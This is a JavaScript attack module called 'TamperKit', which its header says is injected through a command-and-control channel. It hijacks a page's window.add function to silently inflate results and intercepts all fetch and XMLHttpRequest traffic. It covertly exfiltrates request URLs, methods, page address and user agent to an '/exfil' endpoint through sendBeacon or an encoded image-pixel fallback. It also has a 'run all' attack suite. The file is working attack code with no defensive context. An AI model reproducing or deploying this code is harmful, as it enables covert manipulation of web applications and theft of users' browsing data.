// tamper-functions.js - Function Hijacking Module
// Inject via C2 to demonstrate runtime manipulation

const TamperKit = {
  
  // Store original functions for restoration
  originals: {},

  // Hijack window.add with price manipulation
  hijackAdd: function(markup = 100) {
    if (typeof window.add !== 'function') {
      console.error('[TAMPER] window.add not found');
      return false;
    }

    this.originals.add = window.add;

    window.add = function(a, b) {
      const realResult = TamperKit.originals.add(a, b);
      const fakeResult = realResult + markup;

      console.log(`[TAMPER] add(${a}, ${b}) → real=${realResult}, fake=${fakeResult}`);

      // Silent exfil
      TamperKit.exfil({
        attack: 'function_hijack',
        function: 'add',
        original: realResult,
        manipulated: fakeResult,
        args: [a, b]
      });

      return fakeResult;
    };

    console.log(`[TAMPER] ✅ window.add hijacked (+${markup})`);
    return true;
  },

  // Generic function wrapper
  wrapFunction: function(obj, fnName, wrapper) {
    if (typeof obj[fnName] !== 'function') {
      console.error(`[TAMPER] ${fnName} not found`);
      return false;
    }

    const key = `${obj === window ? 'window' : 'obj'}.${fnName}`;
    this.originals[key] = obj[fnName];

    obj[fnName] = wrapper(this.originals[key]);
    console.log(`[TAMPER] ✅ ${key} wrapped`);
    return true;
  },

  // Intercept fetch calls
  hijackFetch: function() {
    this.originals.fetch = window.fetch;

    window.fetch = async function(...args) {
      console.log('[TAMPER] fetch intercepted:', args[0]);
      
      TamperKit.exfil({
        attack: 'fetch_intercept',
        url: args[0],
        options: args[1] || {}
      });

      return TamperKit.originals.fetch.apply(window, args);
    };

    console.log('[TAMPER] ✅ fetch hijacked');
    return true;
  },

  // Intercept XMLHttpRequest
  hijackXHR: function() {
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
      this._tamperUrl = url;
      this._tamperMethod = method;
      return origOpen.apply(this, [method, url, ...rest]);
    };

    XMLHttpRequest.prototype.send = function(body) {
      console.log(`[TAMPER] XHR ${this._tamperMethod} ${this._tamperUrl}`);
      
      TamperKit.exfil({
        attack: 'xhr_intercept',
        method: this._tamperMethod,
        url: this._tamperUrl,
        hasBody: !!body
      });

      return origSend.apply(this, [body]);
    };

    console.log('[TAMPER] ✅ XHR hijacked');
    return true;
  },

  // Silent exfiltration
  exfil: function(data) {
    const payload = {
      ...data,
      url: window.location.href,
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    };

    try {
      navigator.sendBeacon('/exfil', JSON.stringify(payload));
    } catch (e) {
      // Fallback: pixel tracking
      const img = new Image();
      img.src = `/exfil?d=${btoa(JSON.stringify(payload))}`;
    }
  },

  // Restore all hijacked functions
  restore: function() {
    for (const [key, fn] of Object.entries(this.originals)) {
      if (key === 'add') window.add = fn;
      else if (key === 'fetch') window.fetch = fn;
      // Add more as needed
    }
    this.originals = {};
    console.log('[TAMPER] ✅ All functions restored');
  },

  // Full attack suite
  runAll: function() {
    this.hijackAdd(100);
    this.hijackFetch();
    this.hijackXHR();
    console.log('[TAMPER] 🚀 Full tamper suite active');
  }
};

// Auto-run if loaded directly (optional)
// TamperKit.runAll();

if (typeof module !== 'undefined' && module.exports) {
  module.exports = TamperKit;
}
